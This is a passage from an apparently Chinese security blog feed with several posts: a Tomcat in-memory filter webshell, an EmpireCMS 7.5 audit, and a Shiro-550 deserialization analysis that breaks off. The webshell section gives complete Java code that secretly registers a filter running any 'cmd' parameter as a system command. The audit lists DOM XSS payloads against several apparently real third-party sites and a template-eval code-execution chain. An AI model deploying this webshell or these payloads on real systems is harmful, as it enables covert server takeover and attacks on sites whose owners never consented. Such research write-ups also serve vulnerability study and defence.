class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.myServlet;<br><br><span class="hljs-keyword">import</span> org.apache.catalina.Context;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationContext;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardContext;<br><span class="hljs-keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;<br><span class="hljs-keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DemoServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        Field Configs = <span class="hljs-keyword">null</span>;<br>        Map filterConfigs;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//这里是反射获取ApplicationContext的context，也就是standardContext</span><br>            ServletContext servletContext = request.getSession().getServletContext();<br><br>            Field appctx = servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>            appctx.setAccessible(<span class="hljs-keyword">true</span>);<br>            ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);<br><br>            Field stdctx = applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>            stdctx.setAccessible(<span class="hljs-keyword">true</span>);<br>            StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);<br><br><br><br>            String FilterName = <span class="hljs-string">&quot;cmd_Filter&quot;</span>;<br>            Configs = standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>            Configs.setAccessible(<span class="hljs-keyword">true</span>);<br>            filterConfigs = (Map) Configs.get(standardContext);<br><br>            <span class="hljs-keyword">if</span> (filterConfigs.get(FilterName) == <span class="hljs-keyword">null</span>)&#123;<br>                Filter filter = <span class="hljs-keyword">new</span> Filter() &#123;<br><br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException </span>&#123;<br><br>                    &#125;<br><br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException </span>&#123;<br>                        HttpServletRequest req = (HttpServletRequest) servletRequest;<br>                        <span class="hljs-keyword">if</span> (req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-keyword">null</span>)&#123;<br><br>                            InputStream in = Runtime.getRuntime().exec(req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).getInputStream();<br><span class="hljs-comment">//</span><br>                            Scanner s = <span class="hljs-keyword">new</span> Scanner(in).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                            String output = s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>                            servletResponse.getWriter().write(output);<br><br>                            <span class="hljs-keyword">return</span>;<br>                        &#125;<br>                        filterChain.doFilter(servletRequest,servletResponse);<br>                    &#125;<br><br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;<br><br>                    &#125;<br>                &#125;;<br>                <br>                <span class="hljs-comment">//反射获取FilterDef，设置filter名等参数后，调用addFilterDef将FilterDef添加</span><br>                Class&lt;?&gt; FilterDef = Class.forName(<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span>);<br>                Constructor declaredConstructors = FilterDef.getDeclaredConstructor();<br>                FilterDef o = (org.apache.tomcat.util.descriptor.web.FilterDef)declaredConstructors.newInstance();<br>                o.setFilter(filter);<br>                o.setFilterName(FilterName);<br>                o.setFilterClass(filter.getClass().getName());<br>                standardContext.addFilterDef(o);<br><br>                <span class="hljs-comment">//反射获取FilterMap并且设置拦截路径，并调用addFilterMapBefore将FilterMap添加进去</span><br>                Class&lt;?&gt; FilterMap = Class.forName(<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span>);<br>                Constructor&lt;?&gt; declaredConstructor = FilterMap.getDeclaredConstructor();<br>                org.apache.tomcat.util.descriptor.web.FilterMap o1 = (FilterMap)declaredConstructor.newInstance();<br><br>                o1.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>                o1.setFilterName(FilterName);<br>                o1.setDispatcher(DispatcherType.REQUEST.name());<br>                standardContext.addFilterMapBefore(o1);<br><br>                <span class="hljs-comment">//反射获取ApplicationFilterConfig，构造方法将 FilterDef传入后获取filterConfig后，将设置好的filterConfig添加进去</span><br>                Class&lt;?&gt; ApplicationFilterConfig = Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span>);<br>                Constructor&lt;?&gt; declaredConstructor1 = ApplicationFilterConfig.getDeclaredConstructor(Context.class,FilterDef.class);<br>                declaredConstructor1.setAccessible(<span class="hljs-keyword">true</span>);<br>                ApplicationFilterConfig filterConfig = (org.apache.catalina.core.ApplicationFilterConfig) declaredConstructor1.newInstance(standardContext,o);<br>                filterConfigs.put(FilterName,filterConfig);<br>                response.getWriter().write(<span class="hljs-string">&quot;Success&quot;</span>);<br><br><br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        doPost(req,resp);<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>成功添加了filter</p><p><a href="https://imgtu.com/i/RCJA8x"><img src="https://z3.ax1x.com/2021/06/19/RCJA8x.png" alt="RCJA8x.png"></a></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://mp.weixin.qq.com/s/x4pxmeqC1DvRi9AdxZ-0Lw">https://mp.weixin.qq.com/s/x4pxmeqC1DvRi9AdxZ-0Lw</a></p><p><a href="http://m0d9.me/2020/09/27/Java%E5%86%85%E5%AD%98shell%EF%BC%9Aservlet/">http://m0d9.me/2020/09/27/Java%E5%86%85%E5%AD%98shell%EF%BC%9Aservlet/</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/14622879.html">https://www.cnblogs.com/nice0e3/p/14622879.html</a></p><p><a href="http://li9hu.top/tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E4%B8%80-%E5%88%9D%E6%8E%A2/">http://li9hu.top/tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E4%B8%80-%E5%88%9D%E6%8E%A2/</a></p><p><a href="https://xiao-tan.xyz/2021/04/18/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%9D%E6%8E%A2-Filter/">https://xiao-tan.xyz/2021/04/18/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%9D%E6%8E%A2-Filter/</a></p><p><a href="http://wjlshare.com/archives/1529#0x04_Filter">http://wjlshare.com/archives/1529#0x04_Filter</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>代码审计：记一次cnvd证书挖掘</title>
    <link href="/2021/06/11/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E8%AE%B0%E4%B8%80%E6%AC%A1cnvd%E8%AF%81%E4%B9%A6%E6%8C%96%E6%8E%98/"/>
    <url>/2021/06/11/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E8%AE%B0%E4%B8%80%E6%AC%A1cnvd%E8%AF%81%E4%B9%A6%E6%8C%96%E6%8E%98/</url>
    
    <content type="html"><![CDATA[<h1 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h1><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞地址</p><p>/e/data/mfile/ViewPhoto.html</p><p>Request函数获取URL参数输入，通过window.location获取当前地址，根据传入的url参数,获取当前地址url参数起始位置和结束位置。</p><p><a href="https://imgtu.com/i/2WiRqP"><img src="https://z3.ax1x.com/2021/06/11/2WiRqP.png" alt="2WiRqP.png"></a></p><p>通过Request函数获取URL参数，并作为img的src属性和input的value属性，然后通过document.write输出到页面。</p><p><a href="https://imgtu.com/i/2Wiha8"><img src="https://z3.ax1x.com/2021/06/11/2Wiha8.png" alt="2Wiha8.png"></a></p><p>payload</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs haskell">/e/<span class="hljs-class"><span class="hljs-keyword">data</span>/mfile/viewphoto.html?url=&quot; onerror=alert(1);&gt;</span><br>/e/<span class="hljs-class"><span class="hljs-keyword">data</span>/mfile/viewphoto.html?url=1&quot; onerror=alert(1) asd=&quot;</span><br></code></pre></td></tr></table></figure><h2 id="本地复现"><a href="#本地复现" class="headerlink" title="本地复现"></a>本地复现</h2><p>本地测试成功，前提是必须用IE浏览器打开，原因是ViewPhoto.html没有对输入的数据进行url解码，而只有IE浏览器才会把payload进行url解码后输出在html中，其他浏览器会原封不动的输出url编码后的payload，造成利用失败。</p><p><a href="https://imgtu.com/i/2Wi2rt"><img src="https://z3.ax1x.com/2021/06/11/2Wi2rt.png" alt="2Wi2rt.png"></a></p><h2 id="案例复现"><a href="#案例复现" class="headerlink" title="案例复现"></a>案例复现</h2><p>用ie浏览器打开</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>cfdacx.com<span class="hljs-regexp">/e/</span>data<span class="hljs-regexp">/mfile/</span>ViewPhoto.html?url=<span class="hljs-number">1</span><span class="hljs-string">&quot; onerror=alert(1) asd=&quot;</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">121.41</span>.<span class="hljs-number">73.134</span><span class="hljs-regexp">/shshufa/</span>e<span class="hljs-regexp">/data/m</span>file/ViewPhoto.html?url=<span class="hljs-number">1</span><span class="hljs-string">&quot; onerror=alert(1) asd=&quot;</span><br>http:<span class="hljs-regexp">//</span>www.zkhsz.com<span class="hljs-regexp">/m/</span>e<span class="hljs-regexp">/data/m</span>file/ViewPhoto.html?url=<span class="hljs-number">1</span><span class="hljs-string">&quot; onerror=alert(1) asd=&quot;</span><br>http:<span class="hljs-regexp">//m</span>dhrczi.<span class="hljs-number">52</span>xuzhi.com<span class="hljs-regexp">/e/</span>data<span class="hljs-regexp">/mfile/</span>ViewPhoto.html?url=<span class="hljs-number">1</span><span class="hljs-string">&quot; onerror=alert(1) asd=&quot;</span><br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/2WigKI"><img src="https://z3.ax1x.com/2021/06/11/2WigKI.png" alt="2WigKI.png"></a><br><a href="https://imgtu.com/i/2Wiy2d"><img src="https://z3.ax1x.com/2021/06/11/2Wiy2d.png" alt="2Wiy2d.png"></a><br><a href="https://imgtu.com/i/2WifVf"><img src="https://z3.ax1x.com/2021/06/11/2WifVf.png" alt="2WifVf.png"></a></p><h1 id="后台代码执行"><a href="#后台代码执行" class="headerlink" title="后台代码执行"></a>后台代码执行</h1><h2 id="初始化配置"><a href="#初始化配置" class="headerlink" title="初始化配置"></a>初始化配置</h2><p>下载Empirecms7.5</p><p><a href="http://www.phome.net/download/">http://www.phome.net/download/</a></p><p>需要先添加终极栏目</p><p><a href="https://imgtu.com/i/2Wiqrq"><img src="https://z3.ax1x.com/2021/06/11/2Wiqrq.png" alt="2Wiqrq.png"></a></p><p>修改模板选项</p><p><a href="https://imgtu.com/i/2WiXZV"><img src="https://z3.ax1x.com/2021/06/11/2WiXZV.png" alt="2WiXZV.png"></a></p><p>在增加新闻处增加一篇文章，内容按下面的格式即可</p><p><a href="https://imgtu.com/i/2WivIU"><img src="https://z3.ax1x.com/2021/06/11/2WivIU.png" alt="2WivIU.png"></a></p><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><code>e/class/connect.php</code></p><p>ReplaceListVars方法存在eval，参数$listtemp可控，当满足条件$decode==1时触发代码执行</p><p><a href="https://imgtu.com/i/2WiIPg"><img src="https://z3.ax1x.com/2021/06/11/2WiIPg.png" alt="2WiIPg.png"></a></p><p><code>/e/search/result/index.php</code></p><p>参数来源于第二个参数$listvar</p><p><a href="https://imgtu.com/i/2WiT2j"><img src="https://z3.ax1x.com/2021/06/11/2WiT2j.png" alt="2WiT2j.png"></a></p><p><code>/e/search/result/index.php</code></p><p>$listvar来源于$tempr[listvar]</p><p><a href="https://imgtu.com/i/2Wi7xs"><img src="https://z3.ax1x.com/2021/06/11/2Wi7xs.png" alt="2Wi7xs.png"></a></p><p><code>/e/search/result/index.php</code></p><p>$listvar和$docode都来自于phome_enewssearchtemp表</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$search_r</span>[<span class="hljs-string">&#x27;tempid&#x27;</span>])<br>&#123;<br><span class="hljs-variable">$tempr</span>=<span class="hljs-variable">$empire</span>-&gt;fetch1(<span class="hljs-string">&quot;select temptext,subnews,listvar,rownum,showdate,modid,subtitle,docode from &quot;</span>.GetTemptb(<span class="hljs-string">&quot;enewssearchtemp&quot;</span>).<span class="hljs-string">&quot; where tempid=&#x27;&quot;</span>.<span class="hljs-variable">$search_r</span>[<span class="hljs-string">&#x27;tempid&#x27;</span>].<span class="hljs-string">&quot;&#x27; limit 1&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到这两个字段</p><p><a href="https://imgtu.com/i/2WibMn"><img src="https://z3.ax1x.com/2021/06/11/2WibMn.png" alt="2WibMn.png"></a></p><p>登陆后台，进入后台地图-&gt;管理搜索模板，在搜索模板插入恶意代码</p><p><a href="https://imgtu.com/i/2WiLq0"><img src="https://z3.ax1x.com/2021/06/11/2WiLq0.png" alt="2WiLq0.png"></a></p><p>其中可以修改listvar字段的值，在其中加入php代码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml">phpinfo();/*<span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;r&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>[!--no.num--].<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;l&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;[!--titleurl--]&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;_blank&quot;</span>&gt;</span>[!--title--]<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;80%&quot;</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">cellpadding</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">cellspacing</span>=<span class="hljs-string">&quot;0&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tbody</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>[!--smalltext--]<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;a&quot;</span>&gt;</span>[!--titleurl--] - [!--newstime--]<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> - <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fl&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;[!--this.classlink--]&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;_blank&quot;</span>&gt;</span>[!--this.classname--]<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span>*/<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/2WioGQ"><img src="https://z3.ax1x.com/2021/06/11/2WioGQ.png" alt="2WioGQ.png"></a></p><p>由于docode字段默认值为0，需要利用后台的sql执行功能把它改成1</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">update phome_enewssearchtemp <span class="hljs-builtin-name">set</span> <span class="hljs-attribute">docode</span>=1 where <span class="hljs-attribute">tempid</span>=1;<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/2Wi4IS"><img src="https://z3.ax1x.com/2021/06/11/2Wi4IS.png" alt="2Wi4IS.png"></a></p><p>站内搜索添加好的文章，这里必须保证相应标题的内容是存在的，才会触发漏洞</p><p><a href="https://imgtu.com/i/2WiziF"><img src="https://z3.ax1x.com/2021/06/11/2WiziF.png" alt="2WiziF.png"></a></p><p>成功执行</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost<span class="hljs-regexp">/e/</span>search<span class="hljs-regexp">/result/</span>?searchid=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/2WijaT"><img src="https://z3.ax1x.com/2021/06/11/2WijaT.png" alt="2WijaT.png"></a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>第一个xss没通过审核，代码执行过了</p><p>证书</p><p><a href="https://imgtu.com/i/2WFSG4"><img src="https://z3.ax1x.com/2021/06/11/2WFSG4.png" alt="2WFSG4.png"></a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Shiro-550反序列化漏洞分析</title>
    <link href="/2021/05/30/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2021/05/30/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h1><p><code>org.apache.shiro.mgt.AbstractRememberMeManager</code></p><p>首先找到硬编码key的位置</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/2Vwelq"><img src="https://z3.ax1x.com/2021/05/30/2Vwelq.png" alt="2Vwelq.png"></a></p><p>登陆，记得勾选Remember Me</p><p><a href="https://imgtu.com/i/2VwZpn"><img src="https://z3.ax1x.com/2021/05/30/2VwZpn.png" alt="2VwZpn.png"></a></p><p><code>org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin</code></p><p>remeberMe为true，接下来进入<code>remeberIdentity</code></p><p><a href="https://imgtu.com/i/2Vwm60"><img src="https://z3.ax1x.com/2021/05/30/2Vwm60.png" alt="2Vwm60.png"></a></p><p><code>org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity</code></p><p>进入<code>rememberIdentity</code></p><p><a href="https://imgtu.com/i/2VwEfs"><img src="https://z3.ax1x.com/2021/05/30/2VwEfs.png" alt="2VwEfs.png"></a></p><p><code>org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity</code></p><p>第一个函数<code>convertPrincipalsToBytes</code>中先序列化用户名，然后用硬编码的key进行了aes加密</p><p><a href="https://imgtu.com/i/2VwAYj"><img src="https://z3.ax1x.com/2021/05/30/2VwAYj.png" alt="2VwAYj.png"></a></p><p><code>org.apache.shiro.mgt.AbstractRememberMeManager#convertPrincipalsToBytes</code></p><p>先进行序列化操作，再调用<code>encrypt</code>进行加密</p><p><a href="https://imgtu.com/i/2VwnXV"><img src="https://z3.ax1x.com/2021/05/30/2VwnXV.png" alt="2VwnXV.png"></a></p><p><code>org.apache.shiro.mgt.AbstractRememberMeManager#encrypt</code></p><p>这里可知加密方法为<code>AES/CBC/PKCS5Padding</code>，通过<code>getEncryptionCipherkey</code>获取密钥</p><p><a href="https://imgtu.com/i/2VwQ7F"><img src="https://z3.ax1x.com/2021/05/30/2VwQ7F.png" alt="2VwQ7F.png"></a></p><p>ciphrtService</p><p><a href="https://imgtu.com/i/2Vw1k4"><img src="https://z3.ax1x.com/2021/05/30/2Vw1k4.png" alt="2Vw1k4.png"></a></p><h2 id="key的来源"><a href="#key的来源" class="headerlink" title="key的来源"></a>key的来源</h2><p><code>org.apache.shiro.mgt.AbstractRememberMeManager#getEncryptionCipherKey</code></p><p>很明显这个函数就是用来获取key的，可以看到key的来源是<code>encryptionCipherKey</code></p><p><a href="https://imgtu.com/i/2Vw3tJ"><img src="https://z3.ax1x.com/2021/05/30/2Vw3tJ.png" alt="2Vw3tJ.png"></a></p><p>在构造函数中，把硬编码key<code>DEFAULT_CIPHER_KEY_BYTES</code>作为参数传入<code>setCipherKey</code>，再经过<code>setEncryptionCipherKey</code>函数赋值给<code>encryptionCipherKey</code>，这样key就是已知的了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">AbstractRememberMeManager</span><span class="hljs-params">()</span> </span>&#123;<br>       <span class="hljs-keyword">this</span>.setCipherKey(DEFAULT_CIPHER_KEY_BYTES);<br>   &#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setCipherKey</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] cipherKey)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.setEncryptionCipherKey(cipherKey);<br>        <span class="hljs-keyword">this</span>.setDecryptionCipherKey(cipherKey);<br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setEncryptionCipherKey</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] encryptionCipherKey)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.encryptionCipherKey = encryptionCipherKey;<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="继续加密"><a href="#继续加密" class="headerlink" title="继续加密"></a>继续加密</h2><p>进入加密函数，两个参数分别是序列化后的root，和硬编码key</p><p><a href="https://imgtu.com/i/2Vw8h9"><img src="https://z3.ax1x.com/2021/05/30/2Vw8h9.png" alt="2Vw8h9.png"></a></p><p><code>org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity</code></p><p>回到<code>rememberIdentity</code>方法，<code>convertPrincipalsToBytes</code>方法执行完后返回了AES加密后的二进制字节流，接下来进入<code>rememberSerializedIdentity</code></p><p><a href="https://imgtu.com/i/2VwJpR"><img src="https://z3.ax1x.com/2021/05/30/2VwJpR.png" alt="2VwJpR.png"></a></p><p><code>org.apache.shiro.mgt.CookieRememberMeManager#rememberSerializedIdentity</code></p><p>这里的逻辑就很清楚了，把刚刚加密过的数据进行base64编码后再存入cookie</p><p><a href="https://imgtu.com/i/2VwanK"><img src="https://z3.ax1x.com/2021/05/30/2VwanK.png" alt="2VwanK.png"></a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>主要逻辑就是用序列化-&gt;AES-&gt;base64的方式处理cookie</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs css">1<span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.shiro</span><span class="hljs-selector-class">.mgt</span><span class="hljs-selector-class">.AbstractRememberMeManager</span><span class="hljs-selector-id">#onSuccessfulLogin</span><br>判断是否选择了<span class="hljs-selector-tag">rememberMe</span>选项<br><br>2<span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.shiro</span><span class="hljs-selector-class">.mgt</span><span 